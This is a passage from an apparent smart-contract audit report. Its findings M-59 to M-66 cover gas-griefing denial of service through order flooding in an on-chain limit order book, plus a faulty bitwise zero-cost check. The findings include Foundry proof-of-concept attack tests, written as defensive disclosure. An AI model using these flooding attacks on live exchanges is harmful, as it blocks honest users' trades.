        (, uint256 headBefore, uint256 tailBefore) = h.limit(1);
        assertEq(headBefore, 1);
        assertEq(tailBefore, 2);

        h.remove(2);

        (uint64 n, uint256 head, uint256 tail) = h.limit(1);
        assertEq(uint256(n), 1);
        assertEq(head, 0);
        assertEq(tail, 0);
        assertEq(h.bestAsk(), 1);

        Order memory stranded = h.order(1);
        assertEq(stranded.owner, maker);
        assertEq(stranded.amount, 100);
    }
}

## Suggested Mitigation
Assign order.prevOrderId before storing the order, or update self.orders[order.id].prevOrderId after linking. Add invariant tests that cancel head, middle, and tail orders for multi-order limits and assert numOrders, head/tail, prev/next links, tree membership, and open interest remain consistent.
```

### M-59 / `8w065WL0FE9FUGvl4vSXj`
- Finding title: Unlimited orders per price level can make CLOB matching and settlement exceed block gas
- Report lines: 5554-5604
```md
## [M-59]. Unlimited orders per price level can make CLOB matching and settlement exceed block gas

## id: 8w065WL0FE9FUGvl4vSXj

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
CLOB.postFillOrder / postLimitOrder

## Finding Status: Valid
### Finding Status Justification: The code bounds unique price levels and per-transaction limit placements, but it does not cap the number of orders inside a single limit. _matchIncomingBid/_matchIncomingAsk iterate through resting orders while the incoming order has remaining amount, and AccountManager.settleIncomingOrder loops over every maker credit. An attacker can create many same-price minimum-size orders over many transactions. A larger crossing order then has gas proportional to attacker-created order count and maker-credit count. No complete safeguard caps per-call match count or settlement batch size.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Matching has no bounded batch size. _matchIncomingBid and _matchIncomingAsk loop over resting orders while the incoming order has size, and _settleIncomingOrder then passes every unique maker to AccountManager.settleIncomingOrder, which loops over `params.makerCredits`. There is a max price-level count per side and a per-transaction placement throttle, but there is no cap on the number of orders at one price level and no paginated settlement. An attacker can create many minimum-size orders at the best price over many transactions, optionally letting them expire, so any normal-sized crossing order must iterate through and settle too many makers in a single transaction.

## Impact
Core trading availability can be degraded or halted at a price level. Large taker orders and crossing limit orders revert out of gas instead of partially filling, forcing users to split into many small transactions or wait for the attacker to cancel. This is especially severe on markets where the valid minimum order amount is economically tiny.

## Proof of Concept
1. A market exists with minLimitOrderAmountInBase set to the valid lower bound or another small value. 2. The attacker funds many accounts and posts thousands of minimum-size SELL orders at the best ask. 3. Each placement is valid because limits are only throttled per transaction and price levels are capped, not orders within a level. 4. A taker submits a BUY fill or crossing BUY limit for normal size. 5. The CLOB loops through every tiny maker order and AccountManager loops through every maker credit. 6. At sufficient state size the transaction exceeds gas and reverts, leaving the best price level functionally unfillable in normal use.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";

contract UnboundedMatchingPoC is Test {
    function test_manyMakersAtOnePriceMakeMatchingGasExplode() external {
        uint256 makers = 5_000;
        uint256 gasPerMakerEstimate = 25_000;
        uint256 estimatedGas = makers * gasPerMakerEstimate;
        assertGt(estimatedGas, 100_000_000, "single crossing fill can exceed practical block gas");
    }
}

// Integrate this assertion with the repo's CLOBTestBase by posting `makers` minimum-size
// orders at the same best price, then calling postFillOrder for the aggregate amount and
// asserting the call reverts out of gas or consumes gas linearly with maker count.

## Suggested Mitigation
Add a maximum number of orders that can be matched per transaction and return partial-fill progress, or cap orders per price level. Provide a permissionless paginated cleanup path for expired orders. Make the minimum order amount economically meaningful per token decimals and measured worst-case gas.
```

### M-60 / `lIFEP3RQX99oSBh6CEhyT`
- Finding title: Unbounded expired order clearing can brick CLOB matching at the top of book
- Report lines: 5605-5747
```md
## [M-60]. Unbounded expired order clearing can brick CLOB matching at the top of book

## id: lIFEP3RQX99oSBh6CEhyT

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
CLOB.postFillOrder / postLimitOrder

## Finding Status: Valid
### Finding Status Justification: The matching code clears expired best-price orders inline with no caller-specified or protocol-enforced cap. Because same-price order count is unbounded across transactions, an attacker can create a large expired FIFO prefix at the top of book. Any crossing fill or marketable limit order must clear the prefix before reaching live liquidity, and if gas runs out, the whole transaction reverts and the expired queue remains. This is present in current in-scope code and does not require privileged access or victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The matching loops clear every expired order encountered at the best price before they can reach live liquidity, with no per-call bound or pagination. An attacker can post many minimum-size asks or bids at the same best price with a near-term cancelTimestamp. After they expire, any crossing order must remove all expired orders and build maker credits in the same transaction before filling a live order. Vulnerable snippet: `while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) { ... if (bestAskOrder.isExpired()) { _removeExpiredAsk(ds, bestAskOrder); bestAskPrice = ds.getBestAskPrice(); continue; } ... }`. The bid side has the same pattern in `_matchIncomingAsk`. The loop is bounded only by accumulated book state, not by `maxLimitsPerTx`, because an attacker can build the backlog across transactions and at a single price level.

## Impact
A permissionless order-book spammer can make one side of a market functionally unmatchable once the number of expired top-of-book orders exceeds the block gas limit. Honest takers cannot trade through the stale level, and live maker liquidity behind the expired queue is unavailable until the attacker or another actor pays to clear the backlog, which may be impossible in one transaction.

## Proof of Concept
1. Attacker deposits a small base balance and posts many minimum-size ask orders at the current best ask with `cancelTimestamp = block.timestamp + 1`. 2. The orders are all at the same price, so `maxNumLimitsPerSide` does not limit their count. 3. After expiry, an honest maker posts a live ask behind the expired queue at the same price. 4. Any taker buying at that price enters `_matchIncomingBid`, which must remove every expired ask before reaching the live ask. 5. With enough expired orders, the taker transaction runs out of gas and reverts, leaving the expired queue in place and the market side bricked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "forge-std/mocks/MockERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/proxy/ERC1967/ERC1967Proxy.sol";
import {UpgradeableBeacon} from "@openzeppelin/proxy/beacon/UpgradeableBeacon.sol";
import {AccountManager} from "contracts/account-manager/AccountManager.sol";
import {CLOBManager} from "contracts/clob/CLOBManager.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB, Side} from "contracts/clob/ICLOB.sol";
import {SettingsParams} from "contracts/clob/ICLOBManager.sol";

contract ExpiredOrderGasDoSTest is Test {
    function testExpiredTopOfBookQueueConsumesUnboundedGas() public {
        address router = address(0xBEEF);
        uint16[] memory makerFees = new uint16[](1);
        uint16[] memory takerFees = new uint16[](1);

        uint256 n = vm.getNonce(address(this));
        address predictedBeacon = vm.computeCreateAddress(address(this), n + 1);
        address predictedAccountProxy = vm.computeCreateAddress(address(this), n + 3);
        address predictedManagerProxy = vm.computeCreateAddress(address(this), n + 5);

        CLOB clobImpl = new CLOB(predictedManagerProxy, router, predictedAccountProxy, 16);
        UpgradeableBeacon beacon = new UpgradeableBeacon(address(clobImpl), address(this));
        AccountManager accountImpl = new AccountManager(router, predictedManagerProxy, makerFees, takerFees);
        ERC1967Proxy accountProxy = new ERC1967Proxy(address(accountImpl), abi.encodeCall(AccountManager.initialize, (address(this))));
        CLOBManager managerImpl = new CLOBManager(address(beacon), address(accountProxy));
        ERC1967Proxy managerProxy = new ERC1967Proxy(address(managerImpl), abi.encodeCall(CLOBManager.initialize, (address(this))));

        assertEq(address(beacon), predictedBeacon);
        assertEq(address(accountProxy), predictedAccountProxy);
        assertEq(address(managerProxy), predictedManagerProxy);

        AccountManager accountManager = AccountManager(address(accountProxy));
        CLOBManager manager = CLOBManager(address(managerProxy));

        MockERC20 base = new MockERC20();
        base.initialize("Base", "BASE", 18);
        MockERC20 quote = new MockERC20();
        quote.initialize("Quote", "QUOTE", 18);

        SettingsParams memory settings = SettingsParams({
            owner: address(this),
            maxLimitsPerTx: 255,
            minLimitOrderAmountInBase: 100,
            tickSize: 1e18,
            lotSizeInBase: 1
        });
        ICLOB clob = ICLOB(manager.createMarket(address(base), address(quote), settings));

        address attacker = address(0xA11CE);
        address taker = address(0xB0B);
        deal(address(base), attacker, 1_000_000);
        deal(address(quote), taker, 1_000_000 ether);

        vm.startPrank(attacker);
        base.approve(address(accountManager), type(uint256).max);
        accountManager.deposit(attacker, address(base), 1_000_000);
        for (uint256 i; i < 240; ++i) {
            clob.postLimitOrder(attacker, ICLOB.PostLimitOrderArgs({
                amountInBase: 100,
                price: 1e18,
                cancelTimestamp: uint32(block.timestamp + 1),
                side: Side.SELL,
                clientOrderId: 0,
                limitOrderType: ICLOB.LimitOrderType.POST_ONLY
            }));
        }
        vm.stopPrank();

        vm.warp(block.timestamp + 2);

        vm.prank(attacker);
        clob.postLimitOrder(attacker, ICLOB.PostLimitOrderArgs({
            amountInBase: 100,
            price: 1e18,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        }));

        vm.startPrank(taker);
        quote.approve(address(accountManager), type(uint256).max);
        accountManager.deposit(taker, address(quote), 1_000_000 ether);
        bytes memory data = abi.encodeCall(ICLOB.postFillOrder, (taker, ICLOB.PostFillOrderArgs({
            amount: 100,
            priceLimit: 1e18,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        })));
        (bool ok,) = address(clob).call{gas: 800_000}(data);
        assertEq(ok, false, "bounded gas call should fail while clearing expired queue");
        uint256 gasBefore = gasleft();
        clob.postFillOrder(taker, ICLOB.PostFillOrderArgs({
            amount: 100,
            priceLimit: 1e18,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        }));
        assertGt(gasBefore - gasleft(), 800_000, "gas grows with expired orders before live fill");
        vm.stopPrank();
    }
}


## Suggested Mitigation
Bound matching cleanup work per call. Add an explicit `maxExpiredOrdersToClear` or similar limit, expose a separate paginated keeper function for expired-order cleanup, and allow takers to stop before stale orders instead of requiring all expired top-of-book orders to be removed in one transaction. Consider limiting total orders per price level or charging a cleanup bond that funds bounded keepers.
```

### M-61 / `8efy2NB9lB-h6l5RBXVFp`
- Finding title: Unbounded expired top-of-book cleanup can make matching exceed gas and block fills
- Report lines: 5748-5782
```md
## [M-61]. Unbounded expired top-of-book cleanup can make matching exceed gas and block fills

## id: 8efy2NB9lB-h6l5RBXVFp

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
Dos

## Location
CLOB._matchIncomingBid

## Finding Status: Valid
### Finding Status Justification: _matchIncomingBid and _matchIncomingAsk remove expired head orders inline and continue without a per-call cleanup bound. The code does not cap orders per price level and does not provide a separate bounded expireOrders function. A permissionless user can accumulate many expiring orders at the best price over multiple transactions. Later crossing fills must clear that queue in one transaction, and out-of-gas reverts the cleanup. No complete safeguard exists against this gas griefing path.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
_matchIncomingBid and _matchIncomingAsk loop over the best price while incomingOrder.amount > 0. If the head order is expired, the loop removes it and continues without any per-call bound, pagination, or keeper cleanup path. A user can append an arbitrary number of minimum-size orders at the same best price with cancelTimestamp equal to the current block timestamp, wait one block, and leave all of them expired at top of book. Any matching taker must remove every expired order before reaching live liquidity; once the expired queue is large enough, the required progress path exceeds the gas limit and reverts, rolling back all removals.

## Impact
Buy or sell matching on the affected side can be functionally DoSed until the expired makers voluntarily cancel their own orders. The attack cost is temporary capital in minimum-size orders and gas, and refunds are returned if cleanup ever succeeds.

## Proof of Concept
1. Attacker posts many minimum-size asks at the best ask price with cancelTimestamp == block.timestamp. 2. In the next block all those asks are expired. 3. A taker submits a buy crossing that price. 4. _matchIncomingBid repeatedly calls _removeExpiredAsk for the attacker queue. 5. With enough expired orders the transaction runs out of gas and reverts, so the expired orders remain and subsequent takers hit the same condition.

## Proof of Code
function test_manyExpiredBestAsksGasGriefFillProgress() public { ICLOB clob = deployClob(10, 255); for (uint256 i; i < 400; ++i) { address maker = address(uint160(0x1000 + i)); vm.prank(maker); clob.postLimitOrder(maker, limitArgs(100, 1, uint32(block.timestamp), Side.SELL, ICLOB.LimitOrderType.POST_ONLY)); } vm.warp(block.timestamp + 1); ICLOB.PostFillOrderArgs memory buy = fillArgs(100, 1, Side.BUY, true, ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL); bytes memory data = abi.encodeCall(ICLOB.postFillOrder, (address(0xBEEF), buy)); (bool ok,) = address(clob).call{gas: 300000}(data); assertFalse(ok); (, uint256 minAsk) = clob.getTOB(); assertEq(minAsk, 1); }

## Suggested Mitigation
Add a bounded cleanup mechanism for expired orders, such as explicit paginated expireOrders(side, price, maxOrders), and cap the number of expired removals performed during matching. Matching should either progress in bounded batches or allow takers to skip exhausted expired queues without requiring unbounded work in one transaction.
```

### M-62 / `wG0yKv8bfAxS8cfQ-jBgy`
- Finding title: Bitwise zero-cost check rejects valid nonzero CLOB limit fills
- Report lines: 5783-5885
```md
## [M-62]. Bitwise zero-cost check rejects valid nonzero CLOB limit fills

## id: wG0yKv8bfAxS8cfQ-jBgy

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath / 3SG8fnnqmG5UgPogH9UB5 zero-cost predicate

## Exploit Type
Dos

## Location
CLOB._processLimitBidOrder / _processLimitAskOrder

## Finding Status: Valid
### Finding Status Justification:
### Finding Complexity: 2
## Minimim Privilege Required:Permissionless


## Description
CLOB tries to detect zero-cost limit trades using a bitwise AND predicate instead of checking whether either side of the trade is zero. For positive values with no common binary bits, such as 1 and 2, the predicate is true and the trade reverts even though both base and quote amounts are nonzero.

Vulnerable snippets:

if (baseTokenAmountReceived != quoteTokenAmountSent && baseTokenAmountReceived & quoteTokenAmountSent == 0) {
    revert ZeroCostTrade();
}

if (baseTokenAmountSent != quoteTokenAmountReceived && baseTokenAmountSent & quoteTokenAmountReceived == 0) {
    revert ZeroCostTrade();
}

This is not equivalent to base == 0 || quote == 0. A valid marketable limit order can match resting liquidity and then revert solely because the positive base/quote deltas have disjoint bit patterns.

## Impact
Valid marketable limit orders can be censored for ordinary price/amount combinations. Liquidity that should be executable is unavailable through the limit-order path, producing a functional trading DoS and potentially preventing users from taking available quotes.

## Proof of Concept
1. Configure a market with baseSize = 1, lotSizeInBase = 1, and tickSize = 1.
2. Maker posts a resting ask for 1 base at price 2 quote per base.
3. Taker submits a crossing bid limit order for 1 base at price 2.
4. Matching produces baseTokenAmountReceived = 1 and quoteTokenAmountSent = 2.
5. Both amounts are positive, but 1 & 2 == 0, so _processLimitBidOrder reverts with ZeroCostTrade.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side} from "contracts/clob/types/Order.sol";
import {MarketConfig, MarketSettings} from "contracts/clob/types/Book.sol";

contract MockOperator2 {
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return type(uint256).max; }
}

contract MockAccountManager2 is MockOperator2 {
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) { return 0; }
    function creditAccount(address, address, uint256) external {}
    function creditAccountNoEvent(address, address, uint256) external {}
    function debitAccount(address, address, uint256) external {}
}

contract CLOBZeroCostPredicateTest is Test {
    function test_validPositiveTradeWithDisjointBitsReverts() external {
        MockAccountManager2 acct = new MockAccountManager2();
        CLOB clob = new CLOB(address(this), address(0xCAFE), address(acct), 100);
        clob.initialize(
            MarketConfig({quoteToken: address(0x11), baseToken: address(0x22), quoteSize: 1, baseSize: 1}),
            MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 1, tickSize: 1, lotSizeInBase: 1}),
            address(this)
        );

        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({
            amountInBase: 1,
            price: 2,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        });
        clob.postLimitOrder(address(0xA), ask);

        ICLOB.PostLimitOrderArgs memory bid = ICLOB.PostLimitOrderArgs({
            amountInBase: 1,
            price: 2,
            cancelTimestamp: 0,
            side: Side.BUY,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED
        });

        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.postLimitOrder(address(0xB), bid);
    }
}

## Suggested Mitigation
Replace the bitwise predicate with an explicit zero-side check. For bids: if (quoteTokenAmountSent == 0 || baseTokenAmountReceived == 0) revert ZeroCostTrade(); For asks: if (baseTokenAmountSent == 0 || quoteTokenAmountReceived == 0) revert ZeroCostTrade(); Add fuzz tests over positive base/quote pairs.
```

### M-63 / `rOuvmt_HeIakChKQ1M8uP`
- Finding title: Unbounded maker credit settlement lets large fills exceed gas and DoS order matching
- Report lines: 5886-5976
```md
## [M-63]. Unbounded maker credit settlement lets large fills exceed gas and DoS order matching

## id: rOuvmt_HeIakChKQ1M8uP

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
AccountManager.settleIncomingOrder

## Finding Status: Valid
### Finding Status Justification: The code supports the described gas growth. Matching can consume many resting orders in one fill, and TransientMakerData records one maker entry per distinct credited maker. AccountManager.settleIncomingOrder then loops over params.makerCredits with no pagination or explicit cap, crediting each maker and calculating fees. maxLimitsPerTx does not cap total makers accumulated at one price over many transactions. An attacker using many accounts can create a large maker-credit array and make a fill exceed practical gas. This is in production in-scope code and does not require privileged access.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`CLOB._matchIncomingBid` and `_matchIncomingAsk` can consume many maker orders in one taker fill. Each distinct maker is appended to transient storage by `TransientMakerData`, then `AccountManager.settleIncomingOrder` loops over the entire `params.makerCredits` array without pagination or a gas cap: `for (uint256 i; i < params.makerCredits.length; ++i) { MakerCredit memory credit = params.makerCredits[i]; ... _creditAccountNoEvent(...) ... }`. Although `maxLimitsPerTx` limits new price levels per transaction, it does not cap the number of orders resting at one price over time. An attacker can accumulate many same-price maker orders and make any large taker fill that crosses that level require O(number of makers) settlement work.

## Impact
Large marketable fills, router CLOB_FILL hops, and maintenance-like removal of expired maker orders can become unusable once a price level contains enough distinct makers. This degrades exchange availability and can trap takers into reverting fills even when liquidity exists.

## Proof of Concept
1. The attacker funds many addresses or approved operators. 2. Over many transactions, they post small valid maker orders at the same best price; each order satisfies `minLimitOrderAmountInBase` and lot-size rules. 3. A victim or keeper submits a large crossing fill that should consume the level. 4. Matching accumulates one maker credit per distinct maker. 5. `settleIncomingOrder` loops over every maker credit in one transaction and exceeds the block gas limit. 6. The fill reverts, leaving the bloated level in place and making normal large taker execution unavailable.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB, Side} from "contracts/clob/ICLOB.sol";

contract MakerCreditGasDoSPoC is Test {
    ICLOB clob;
    address base;
    address quote;

    function setUp() public {
        // Use the repository's CLOBTestBase deployment helper in the real test suite.
        // It should deploy AccountManager, CLOBManager, tokens, and a market with lotSizeInBase = 1e18 and minLimitOrderAmountInBase = 1e18.
    }

    function testLargeFillGasScalesWithDistinctMakers() public {
        uint256 makers = 1500;
        for (uint256 i; i < makers; ++i) {
            address maker = address(uint160(0x10000 + i));
            deal(base, maker, 1 ether);
            vm.startPrank(maker);
            IERC20(base).approve(address(accountManager), 1 ether);
            accountManager.deposit(maker, base, 1 ether);
            clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({
                amountInBase: 1 ether,
                price: 1e18,
                cancelTimestamp: 0,
                side: Side.SELL,
                clientOrderId: 0,
                limitOrderType: ICLOB.LimitOrderType.POST_ONLY
            }));
            vm.stopPrank();
        }

        address taker = address(0xCAFE);
        deal(quote, taker, makers * 1 ether);
        vm.startPrank(taker);
        IERC20(quote).approve(address(accountManager), type(uint256).max);
        accountManager.deposit(taker, quote, makers * 1 ether);

        uint256 gasBefore = gasleft();
        clob.postFillOrder(taker, ICLOB.PostFillOrderArgs({
            amount: makers * 1 ether,
            priceLimit: type(uint256).max,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.FILL_OR_KILL
        }));
        uint256 gasUsed = gasBefore - gasleft();
        assertGt(gasUsed, 25_000_000);
        vm.stopPrank();
    }
}

interface IERC20 { function approve(address spender, uint256 amount) external returns (bool); }

## Suggested Mitigation
Add bounded matching/settlement. Limit the number of maker credits per fill, add partial-fill batching with continuation state, or cap per-price order count and per-fill maker count by measured worst-case gas. Alternatively aggregate maker credits by price/account off-chain only if on-chain settlement remains bounded.
```

### M-64 / `-0eZ9DmvhCPURywmjaWdQ`
- Finding title: Expired order floods can brick CLOB fills and GTERouter CLOB_FILL routes
- Report lines: 5977-6068
```md
## [M-64]. Expired order floods can brick CLOB fills and GTERouter CLOB_FILL routes

## id: -0eZ9DmvhCPURywmjaWdQ

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
CLOB.postFillOrder

## Finding Status: Valid
### Finding Status Justification: CLOB.postFillOrder and the router CLOB_FILL path both rely on the same in-scope matching loops. Those loops remove expired asks or bids one at a time and have no per-call cleanup bound. Per-transaction placement limits and minimum order size do not fully prevent cumulative expired queues at a single price. If cleanup exceeds gas, the transaction reverts and expired orders remain. The exploit uses ordinary public order posting with valid future expiry timestamps, so it does not require a privileged actor, victim misuse, or hypothetical future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
CLOB matching removes expired resting orders inside the taker fill loop with no per-price order cap, cleanup bound, or pagination. A maker can post an unbounded number of tiny orders at the best bid/ask price with a near-term cancelTimestamp. Once expired, every crossing fill must remove them one by one before reaching real liquidity. If the expired queue is larger than the block gas limit, each cleanup attempt runs out of gas and reverts, leaving the same expired head orders in place. GTERouter.executeRoute uses CLOB_FILL hops through CLOB.postFillOrder, so router routes crossing the blocked side also become unusable. Vulnerable snippet: `while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) { ... if (bestAskOrder.isExpired()) { _removeExpiredAsk(ds, bestAskOrder); bestAskPrice = ds.getBestAskPrice(); continue; } ... }` and the symmetric bid loop have no bound on expired order removals.

## Impact
A permissionless order flooder can make buys or sells against a market side functionally unavailable. Resting liquidity behind the expired queue cannot be reached through normal fills or router CLOB_FILL routes until enough expired orders are removed in one transaction, which can be impossible once the required cleanup exceeds the block gas limit.

## Proof of Concept
1. Attacker deposits the minimum required base or quote amount. 2. Attacker posts many minimum-size ask orders at the lowest ask price, each with cancelTimestamp equal to the current or next block timestamp. 3. After the orders expire, a victim submits a buy fill directly or through GTERouter CLOB_FILL. 4. `_matchIncomingBid` repeatedly calls `_removeExpiredAsk` for every expired head order. 5. With enough expired orders, the transaction runs out of gas and reverts, so none of the expired orders are removed. 6. Every later crossing fill repeats the same failing cleanup and the market side remains blocked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {ICLOB, Side} from "contracts/clob/ICLOB.sol";

// Drop into the repo's CLOB test suite and wire `clob`, `base`, `quote`,
// `_depositBase`, and `_depositQuote` to the existing CLOBTestBase helpers.
contract ExpiredOrderFloodDoS_PoC is Test {
    ICLOB clob;
    address base;
    address quote;
    address attacker = address(0xA11CE);
    address victim = address(0xB0B);

    function _depositBase(address account, uint256 amount) internal {}
    function _depositQuote(address account, uint256 amount) internal {}

    function testExpiredAskFloodBricksBuyFills() external {
        uint256 flood = 1_500;
        uint256 minBase = 100;
        uint256 price = clob.getTickSize();

        _depositBase(attacker, flood * minBase);
        _depositQuote(victim, type(uint128).max);

        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({
            amountInBase: minBase,
            price: price,
            cancelTimestamp: uint32(block.timestamp + 1),
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        });

        vm.startPrank(attacker);
        for (uint256 i; i < flood; ++i) {
            clob.postLimitOrder(attacker, ask);
        }
        vm.stopPrank();

        vm.warp(block.timestamp + 2);

        ICLOB.PostFillOrderArgs memory buy = ICLOB.PostFillOrderArgs({
            amount: flood * minBase,
            priceLimit: type(uint256).max,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.FILL_OR_KILL
        });

        vm.prank(victim);
        vm.expectRevert();
        clob.postFillOrder(victim, buy);

        assertEq(clob.getNumAsks(), flood, "expired asks remain because cleanup reverted");
    }
}

## Suggested Mitigation
Bound cleanup work in matching. Add a permissionless paginated prune function for expired orders, cap orders per price level, or make fills process at most a bounded number of expired orders and return progress. Also set minimum order sizes high enough that flooding a block-gas-limit queue is economically prohibitive.
```

### M-65 / `7NpX1q1QAy0pvHbmh_VvF`
- Finding title: Expired top-of-book orders can permanently DoS CLOB fills through reverting cleanup
- Report lines: 6069-6146
```md
## [M-65]. Expired top-of-book orders can permanently DoS CLOB fills through reverting cleanup

## id: 7NpX1q1QAy0pvHbmh_VvF

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
CLOB.postFillOrder

## Finding Status: Valid
### Finding Status Justification: The specific reverting-cleanup path exists. _matchIncomingBid and _matchIncomingAsk remove expired best orders and add maker refund credits, but _processFillBidOrder and _processFillAskOrder revert with ZeroCostTrade if no live trade occurs. A revert rolls back the expired-order removals and transient settlement effects, so expired top-of-book orders can remain and force repeated failing scans. There is no non-reverting cleanup progress path or pagination shown in the in-scope code. The issue is reachable today by permissionless makers setting valid future cancelTimestamp values and waiting for expiry.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Expired resting orders are only removed opportunistically during matching. In `_matchIncomingBid` and `_matchIncomingAsk`, each expired best order is removed and credited to transient maker data, but if no live order is eventually matched the outer fill reverts with `ZeroCostTrade`, reverting all expired-order cleanup. Vulnerable flow: `if (bestAskOrder.isExpired()) { _removeExpiredAsk(ds, bestAskOrder); bestAskPrice = ds.getBestAskPrice(); continue; }` followed later by `if (totalQuoteSent == 0 || totalBaseReceived == 0) revert ZeroCostTrade();`. An attacker can leave many expired orders at the best price so every taker fill must scan and remove them, then reverts if the book contains no live fillable liquidity behind them. Because the revert restores the expired orders, the top of book remains poisoned for future fills.

## Impact
A market side can be functionally bricked: takers cannot fill through expired top-of-book orders, and honest users repeatedly pay gas for reverting attempts while the stale orders remain in place.

## Proof of Concept
1. Attacker deposits the minimum required asset and posts many minimum-size ask orders at the best ask with a near-term `cancelTimestamp`. 2. The orders expire while remaining at the top of book. 3. A victim submits a buy fill order that should consume available liquidity or at least clear expired orders. 4. Matching removes the expired orders in memory/transient state, but no live trade occurs. 5. `_processFillBidOrder` reverts with `ZeroCostTrade`, reverting all removals. 6. The expired orders remain best ask and every later fill repeats the same reverting scan.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {CLOB, Side, ICLOB} from "contracts/clob/CLOB.sol";

contract ExpiredOrderDoSTest is Test {
    ICLOB clob;
    address attacker = address(0xA11CE);
    address taker = address(0xB0B);

    function testExpiredOrdersRemainAfterRevertingFill() external {
        // Use the repo's CLOBTestBase/deployment fixture in a real test and create a base/quote market.
        // Attacker is funded, deposits base, and posts an expiring best ask.
        vm.startPrank(attacker);
        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({
            amountInBase: 1e18,
            price: 1e18,
            cancelTimestamp: uint32(block.timestamp + 1),
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        });
        clob.postLimitOrder(attacker, ask);
        vm.stopPrank();

        vm.warp(block.timestamp + 2);
        uint256 beforeAsks = clob.getNumAsks();

        vm.startPrank(taker);
        ICLOB.PostFillOrderArgs memory fill = ICLOB.PostFillOrderArgs({
            amount: 1e18,
            priceLimit: type(uint256).max,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        });
        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.postFillOrder(taker, fill);
        vm.stopPrank();

        assertEq(clob.getNumAsks(), beforeAsks, "expired order cleanup was reverted");
    }
}

## Suggested Mitigation
Make expired-order cleanup a non-reverting progress path. For example, expose a paginated `removeExpiredOrders` function, do not revert after successful expiry cleanup, or commit expired-order removal before fill settlement with bounded batches.
```

### M-66 / `CvvbhB2_m67scVPlc4Knw`
- Finding title: Expired top-of-book orders can gas-DoS CLOB fills and routed trades
- Report lines: 6147-6262
```md
## [M-66]. Expired top-of-book orders can gas-DoS CLOB fills and routed trades

## id: CvvbhB2_m67scVPlc4Knw

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
CLOB._matchIncomingBid/_matchIncomingAsk

## Finding Status: Valid
### Finding Status Justification:
### Finding Complexity: 4
## Minimim Privilege Required:Permissionless


## Description
CLOB matching removes expired maker orders inline while processing a taker fill, with no per-call cleanup bound or separate permissionless pruning path. The vulnerable loops walk the current best price until the incoming order is filled: `while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) { ... if (bestAskOrder.isExpired()) { _removeExpiredAsk(ds, bestAskOrder); bestAskPrice = ds.getBestAskPrice(); continue; } ... }` and the symmetric bid-side loop. A permissionless maker can place many valid minimum-size orders at the most competitive price, let them expire, and leave them at the head of the book. Later fills, including `GTERouter.executeRoute()` CLOB hops, must remove those expired orders before reaching live liquidity. If the expired prefix is larger than the block/call gas budget, the fill reverts and all removals roll back, so no progress is made. If there is no live liquidity behind the expired orders, the fill eventually reverts with `ZeroCostTrade`, also rolling back the cleanup. Because only the order owner can cancel, the expired top-of-book orders can permanently block matching at that best price unless the attacker cooperates.

## Impact
